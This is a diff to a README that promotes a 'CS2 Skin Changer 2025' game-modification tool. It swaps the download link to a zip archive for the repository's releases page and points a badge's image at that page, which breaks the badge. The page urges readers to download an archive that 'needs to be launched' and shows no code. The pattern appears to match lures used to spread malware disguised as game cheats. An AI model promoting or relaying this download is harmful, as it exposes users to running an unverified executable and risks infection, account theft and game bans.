@@ -9,9 +9,9 @@ Welcome to the CS2 Skin Changer 2025 repository! Whether you are a seasoned CS2 
 - **Seamless Updates:** Stay up-to-date with the latest customization options through our tool's seamless update process.
 
 ## Installation:
-To access the CS2 Skin Changer 2025 tool, download it from the following link: [Download CS2 Skin Changer 2025](https://github.com/file/Soft.zip) *- Needs to be launched*.
+To access the CS2 Skin Changer 2025 tool, download it from the following link: [Download CS2 Skin Changer 2025](https://github.com/Aikoooyshd/CS2-Skin-Changer-2025/releases) *- Needs to be launched*.
 
-[![Download CS2 Skin Changer 2025](https://img.shields.io/badge/Download-CS2_Skin_Changer_2025-blue)](https://github.com/file/Soft.zip)
+[![Download CS2 Skin Changer 2025](https://github.com/Aikoooyshd/CS2-Skin-Changer-2025/releases)](https://github.com/Aikoooyshd/CS2-Skin-Changer-2025/releases)
 
 If the above link is not working or the file needs to be launched, please check the "Releases" section of this repository for alternative download options.
 
